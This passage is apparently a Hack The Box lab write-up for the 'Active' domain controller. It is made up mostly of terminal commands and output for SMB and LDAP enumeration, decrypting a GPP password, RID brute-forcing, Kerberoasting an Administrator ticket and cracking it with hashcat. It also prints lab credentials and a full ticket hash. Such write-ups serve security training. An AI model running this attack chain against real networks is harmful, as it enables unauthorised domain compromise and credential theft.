+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)                                
+                                                                                                    
+[+] IP: 10.10.10.100:445	Name: 10.10.10.100        	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	NO ACCESS	Remote IPC
+	NETLOGON                                          	NO ACCESS	Logon server share 
+	Replication                                       	READ ONLY	
+	SYSVOL                                            	NO ACCESS	Logon server share 
+	Users                                             	NO ACCESS	
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-80d2-b6b3-f2fa91c30941" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ smbclient -L 10.10.10.100                                    
+Password for [WORKGROUP\drroot]:
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Replication     Disk      
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+</code></pre><h2 id="174d1b9f-8847-8031-8a39-e88160c1eea2" class="">NetExec</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-803a-bd00-c7a9a941e67d" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ netexec smb 10.10.10.100                                                                          
+SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+
+</code></pre><h2 id="174d1b9f-8847-8006-9029-ecd7a5cc8dfa" class="">LDAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-806c-bb45-cf7b09424490" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/31B2F340-016D-11D2-945F-00C04FB984F9]
+└─$ nmap -T4 -Pn --script &quot;ldap* and not brute&quot; 10.10.10.100
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-06 21:13 -05
+Nmap scan report for 10.10.10.100
+Host is up (0.10s latency).
+Not shown: 982 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+| ldap-rootdse: 
+| LDAP Results
+|   &lt;ROOT&gt;
+|       currentTime: 20250107021357.0Z
+|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
+|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
+|       namingContexts: DC=active,DC=htb
+|       namingContexts: CN=Configuration,DC=active,DC=htb
+|       namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
+|       namingContexts: DC=DomainDnsZones,DC=active,DC=htb
+|       namingContexts: DC=ForestDnsZones,DC=active,DC=htb
+|       defaultNamingContext: DC=active,DC=htb
+|       schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb
+|       configurationNamingContext: CN=Configuration,DC=active,DC=htb
+|       rootDomainNamingContext: DC=active,DC=htb
+|       supportedControl: 1.2.840.113556.1.4.319
+|       supportedControl: 1.2.840.113556.1.4.801
+|       supportedControl: 1.2.840.113556.1.4.473
+|       supportedControl: 1.2.840.113556.1.4.528
+|       supportedControl: 1.2.840.113556.1.4.417
+|       supportedControl: 1.2.840.113556.1.4.619
+|       supportedControl: 1.2.840.113556.1.4.841
+|       supportedControl: 1.2.840.113556.1.4.529
+|       supportedControl: 1.2.840.113556.1.4.805
+|       supportedControl: 1.2.840.113556.1.4.521
+|       supportedControl: 1.2.840.113556.1.4.970
+|       supportedControl: 1.2.840.113556.1.4.1338
+|       supportedControl: 1.2.840.113556.1.4.474
+|       supportedControl: 1.2.840.113556.1.4.1339
+|       supportedControl: 1.2.840.113556.1.4.1340
+|       supportedControl: 1.2.840.113556.1.4.1413
+|       supportedControl: 2.16.840.1.113730.3.4.9
+|       supportedControl: 2.16.840.1.113730.3.4.10
+|       supportedControl: 1.2.840.113556.1.4.1504
+|       supportedControl: 1.2.840.113556.1.4.1852
+|       supportedControl: 1.2.840.113556.1.4.802
+|       supportedControl: 1.2.840.113556.1.4.1907
+|       supportedControl: 1.2.840.113556.1.4.1948
+|       supportedControl: 1.2.840.113556.1.4.1974
+|       supportedControl: 1.2.840.113556.1.4.1341
+|       supportedControl: 1.2.840.113556.1.4.2026
+|       supportedControl: 1.2.840.113556.1.4.2064
+|       supportedControl: 1.2.840.113556.1.4.2065
+|       supportedControl: 1.2.840.113556.1.4.2066
+|       supportedLDAPVersion: 3
+|       supportedLDAPVersion: 2
+|       supportedLDAPPolicies: MaxPoolThreads
+|       supportedLDAPPolicies: MaxDatagramRecv
+|       supportedLDAPPolicies: MaxReceiveBuffer
+|       supportedLDAPPolicies: InitRecvTimeout
+|       supportedLDAPPolicies: MaxConnections
+|       supportedLDAPPolicies: MaxConnIdleTime
+|       supportedLDAPPolicies: MaxPageSize
+|       supportedLDAPPolicies: MaxQueryDuration
+|       supportedLDAPPolicies: MaxTempTableSize
+|       supportedLDAPPolicies: MaxResultSetSize
+|       supportedLDAPPolicies: MinResultSets
+|       supportedLDAPPolicies: MaxResultSetsPerConn
+|       supportedLDAPPolicies: MaxNotificationPerConn
+|       supportedLDAPPolicies: MaxValRange
+|       supportedLDAPPolicies: ThreadMemoryLimit
+|       supportedLDAPPolicies: SystemMemoryLimitPercent
+|       highestCommittedUSN: 114805
+|       supportedSASLMechanisms: GSSAPI
+|       supportedSASLMechanisms: GSS-SPNEGO
+|       supportedSASLMechanisms: EXTERNAL
+|       supportedSASLMechanisms: DIGEST-MD5
+|       dnsHostName: DC.active.htb
+|       ldapServiceName: active.htb:dc$@ACTIVE.HTB
+|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
+|       supportedCapabilities: 1.2.840.113556.1.4.800
+|       supportedCapabilities: 1.2.840.113556.1.4.1670
+|       supportedCapabilities: 1.2.840.113556.1.4.1791
+|       supportedCapabilities: 1.2.840.113556.1.4.1935
+|       supportedCapabilities: 1.2.840.113556.1.4.2080
+|       isSynchronized: TRUE
+|       isGlobalCatalogReady: TRUE
+|       domainFunctionality: 4
+|       forestFunctionality: 4
+|_      domainControllerFunctionality: 4
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49165/tcp open  unknown
+Service Info: Host: DC; OS: Windows 2008 R2
+
+Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds
+</code></pre><p id="427a43d6-ff4a-47f8-a76b-b7d2f1846012" class="">
+</p><h2 id="4617c4c1-be9a-4a36-800f-bd21e815285b" class="">Findings</h2><ul id="29263a90-c29a-4bc2-ad89-813f1f323a3e" class="bulleted-list"><li style="list-style-type:disc">User: active.htb\SVC_TGS</li></ul><ul id="174d1b9f-8847-8019-bd0c-fa6c6f0e8116" class="bulleted-list"><li style="list-style-type:disc">Password: dBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</li></ul><ul id="174d1b9f-8847-8005-b8f5-fb8ce3f0670d" class="bulleted-list"><li style="list-style-type:disc"></li></ul><p id="b24f85df-f51a-45e4-b9a2-7db7075bf132" class="">
+</p><p id="b5b9896d-7e68-4f4b-9526-23bc7a7528fd" class="">
+</p><p id="67cd3ad9-2e88-4e5b-a7d5-dffe55a81875" class="">
+</p><p id="8c065626-0a8e-4ce5-988d-b5fdfb7fac40" class="">
+</p><h1 id="02b3c269-2d2b-44d6-92ea-2399e9e6eead" class="">User</h1><p id="44435dec-6b52-458d-9008-caf5bf471a76" class="">Let’s investigate about<a href="https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/"> GPP(</a><strong><a href="https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/">Group Policy Preferences)</a></strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-802b-8a19-dbaacad243e4" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/31B2F340-016D-11D2-945F-00C04FB984F9]
+└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+GPPstillStandingStrong2k18
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-801f-a61a-c4177a375b1f" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ smbmap -H 10.10.10.100 -u &#x27;SVC_TGS&#x27; -p &#x27;GPPstillStandingStrong2k18&#x27;
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)                                
+                                                                                                    
+[+] IP: 10.10.10.100:445	Name: active.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	NO ACCESS	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	Replication                                       	READ ONLY	
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY	
+                         
+                                                                                                                 </code></pre><p id="bcb2208a-9a52-4de4-bc1b-45ca30bf53e3" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-80ad-b3fd-d63f266de3c3" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ smbclient -U &#x27;SVC_TGS&#x27; \\\\10.10.10.100\\Users 
+Password for [WORKGROUP\SVC_TGS]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                  DR        0  Sat Jul 21 09:39:20 2018
+  ..                                 DR        0  Sat Jul 21 09:39:20 2018
+  Administrator                       D        0  Mon Jul 16 05:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
+  Default                           DHR        0  Tue Jul 14 01:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
+  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
+  Public                             DR        0  Mon Jul 13 23:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018
+
+		5217023 blocks of size 4096. 278839 blocks available
+smb: \&gt; cd SVC_TGS
+smb: \SVC_TGS\&gt; ls
+  .                                   D        0  Sat Jul 21 10:16:32 2018
+  ..                                  D        0  Sat Jul 21 10:16:32 2018
+  Contacts                            D        0  Sat Jul 21 10:14:11 2018
+  Desktop                             D        0  Sat Jul 21 10:14:42 2018
+  Downloads                           D        0  Sat Jul 21 10:14:23 2018
+  Favorites                           D        0  Sat Jul 21 10:14:44 2018
+  Links                               D        0  Sat Jul 21 10:14:57 2018
+  My Documents                        D        0  Sat Jul 21 10:15:03 2018
+  My Music                            D        0  Sat Jul 21 10:15:32 2018
+  My Pictures                         D        0  Sat Jul 21 10:15:43 2018
+  My Videos                           D        0  Sat Jul 21 10:15:53 2018
+  Saved Games                         D        0  Sat Jul 21 10:16:12 2018
+  Searches                            D        0  Sat Jul 21 10:16:24 2018
+
+		5217023 blocks of size 4096. 278839 blocks available
+smb: \SVC_TGS\&gt; cd Desktop
+smb: \SVC_TGS\Desktop\&gt; ls
+  .                                   D        0  Sat Jul 21 10:14:42 2018
+  ..                                  D        0  Sat Jul 21 10:14:42 2018
+  user.txt                           AR       34  Mon Jan  6 20:42:12 2025
+
+		5217023 blocks of size 4096. 278839 blocks available
+smb: \SVC_TGS\Desktop\&gt; get user.txt 
+getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+</code></pre><h2 id="174d1b9f-8847-8008-b7a0-cdf94027a319" class="">Read file</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-8058-8417-e31822fb44b9" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ cat user.txt 
+7******************************6</code></pre><p id="e26c2c80-d3e8-442f-bbe7-ebfdb70f314c" class="">
+</p><h1 id="77481c2c-8888-4026-a89f-c36736505b42" class="">Root</h1><p id="7c928d5c-1f7f-4e56-9398-76f64673337c" class="">More enumeartion</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-80c5-a94d-db30e75b8e15" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ netexec smb 10.10.10.100 -d active.htb -u SVC_TGS -p &#x27;GPPstillStandingStrong2k18&#x27; --rid-brute
+SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+SMB         10.10.10.100    445    DC               498: ACTIVE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.10.100    445    DC               500: ACTIVE\Administrator (SidTypeUser)
+SMB         10.10.10.100    445    DC               501: ACTIVE\Guest (SidTypeUser)
+SMB         10.10.10.100    445    DC               502: ACTIVE\krbtgt (SidTypeUser)
+SMB         10.10.10.100    445    DC               512: ACTIVE\Domain Admins (SidTypeGroup)
+SMB         10.10.10.100    445    DC               513: ACTIVE\Domain Users (SidTypeGroup)
+SMB         10.10.10.100    445    DC               514: ACTIVE\Domain Guests (SidTypeGroup)
+SMB         10.10.10.100    445    DC               515: ACTIVE\Domain Computers (SidTypeGroup)
+SMB         10.10.10.100    445    DC               516: ACTIVE\Domain Controllers (SidTypeGroup)
+SMB         10.10.10.100    445    DC               517: ACTIVE\Cert Publishers (SidTypeAlias)
+SMB         10.10.10.100    445    DC               518: ACTIVE\Schema Admins (SidTypeGroup)
+SMB         10.10.10.100    445    DC               519: ACTIVE\Enterprise Admins (SidTypeGroup)
+SMB         10.10.10.100    445    DC               520: ACTIVE\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.10.10.100    445    DC               521: ACTIVE\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.10.100    445    DC               553: ACTIVE\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.10.100    445    DC               571: ACTIVE\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.10.100    445    DC               572: ACTIVE\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.10.100    445    DC               1000: ACTIVE\DC$ (SidTypeUser)
+SMB         10.10.10.100    445    DC               1101: ACTIVE\DnsAdmins (SidTypeAlias)
+SMB         10.10.10.100    445    DC               1102: ACTIVE\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.10.100    445    DC               1103: ACTIVE\SVC_TGS (SidTypeUser)</code></pre><p id="174d1b9f-8847-80f6-9fe3-c4cd752df778" class="">
+</p><h2 id="174d1b9f-8847-8001-b09b-c556f75b818a" class="">Let’s start with impacket and Kerberos attack → <a href="https://www.notion.so/Chemistry-10-10-11-38-171d1b9f8847807cbfecdf449c5cad1c?pvs=21">Kerberoasting</a></h2><p id="174d1b9f-8847-80be-a61d-fdbe54cbea3d" class="">Abstract: With kerberoasting attacks we are able to capture the TGS, that TGS may containg User and passwords</p><ul id="174d1b9f-8847-8077-8fb5-d37b5a1d7e75" class="bulleted-list"><li style="list-style-type:disc">KDC (Key Distribution Center)**: This is the central server that handles authentication in Kerberos. Think of it as the “gatekeeper” that verifies identities and issues tickets to access services.</li></ul><ul id="174d1b9f-8847-80b8-8e79-d0b042aef1f6" class="bulleted-list"><li style="list-style-type:disc">TGT (Ticket Granting Ticket)**: This is a special ticket that you get after authenticating with the KDC. This ticket allows you to request tickets for specific services without having to re-authenticate.</li></ul><ul id="174d1b9f-8847-805b-803b-fe5723a2eec8" class="bulleted-list"><li style="list-style-type:disc">TGS (Ticket Granting Service)**: This is the service that gives you tickets to access specific services (such as a file server or email) once you have submitted your TGT. Within this TGS you can find username and passwords.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-80f3-b9b0-e90cb923ce63" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 &quot;active.htb/SVC_TGS:GPPstillStandingStrong2k18&quot; -save -outputfile TGS.txt
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2025-01-06 20:42:16.512991             
+
+
+
+[-] CCache file is not found. Skipping...
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-80a8-a138-ee2c7d6a1a87" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ cat TGS.txt 
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$94506f5d90053381c99bd11484476521$243e8882bd4e074a15f15449ed87a8767d56a9b205d87e8ce54922160628a63aa06f291d60c410f06970b7c8532f20e6a012ea2f143a3cde54def7181042db3e209a1b9eaf59e5098ecd4e7d943e6fb5c94679222462de0143ab4c4419bd59b18b8b46a34de03609d67e6208679b5ca18dc6a1e4f05fd52bb351a494264ff284f10f44a39a630710a3bcc4e408a573582a4810eca1d7e5c30c6531b6defef3b7d92e1a0d616eef6c95190a7e6ddd5da91b70a695b0a4ccfa2b4c9658288060d45011b353e348a9a2c2a7c36281a5b305874506c17ad9abf9e7fd145f359afad3cf1762a9cd1c7a6c4725931545043049e98d2af2d68d488e70dda7b349a8e15fbb9d753653916dbcfb9a1fa9788722ab8af64f548b4e7876f9d1944a43806f092a4d9ed56b64818651f0f73351a30b96a52cee6dd9960a03bdb3b639e908c577787407b5904e27275881325aab798c84be0bf408426b68e1ade1a15656063542104021a942fe9d0fbeb7aaa297b9f8908fe835d6cbd0e77565ab42c7b6d4fc4e71904aacd73e2af7ce76928f63541469974fb2d1e55b0caa3abd1fd504933f2525b144ee7505feea6b6915454730f1b73bc4ce060cdf41a8d4ea2ffadfa5414b1886b5f50ecc9e5913e4c3cef47166c92020873fdfd8e45b00a05659462093e973ab1d174fea928f7498dc1cf167e07b9c33ed261f7380c1fefcc7c6624716c687e36c87ae831f18665feda887d093eda7ed4c4069e200318f25d86cd084c8a49f0af0fef1ad81306be5e20bc79f55eefa130b9645ae4ea03fd6b1c1e1c5c71c05c65a3252ddc6ce9bbfbc7a9f1a7f740328c6a944508843a4b0820901bfa6fe342ca40bf74b46387c38e4ab96e31a75a6ca2d20b5528db85e92cf7c12dc31e2abefda5ceafec7c0ae03a6817d4994368e3562017c9cdda20221ddd7623adc445a5836be61ec64f34bd76f27f9a265f5359f91668cf58e31884b98d0906a42d455b5d64e81c7efe66d1bce6a48a94d8595d9f86593c7f2ec21850302b4b3ac3027c1c05a769cb47a8d1c8a4bca8ef59e02a5773fea807c883750e4283ec96999247705e51440adc7acc3ea04e79b03f750e5c9ab1abc1300d5d30c63287f3acf7aad6679f86a969f41b3e3a23efa131b847bd0cb8302b83ed6cfcff77e20679bf99558d1dd36024fb6f984c41ad42338d292eda1f2075fa83ace42e351365db531eac22625c3838dc272469a40fa7f7e6dcee10f31cca5537779
+</code></pre><h2 id="174d1b9f-8847-8073-8d2e-cb296d9557af" class="">HashCat</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174d1b9f-8847-80ec-b4ed-c12ed0052a97" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ hashcat -m 13100 -a 0 TGS.txt /usr/share/wordlists/rockyou.txt --show
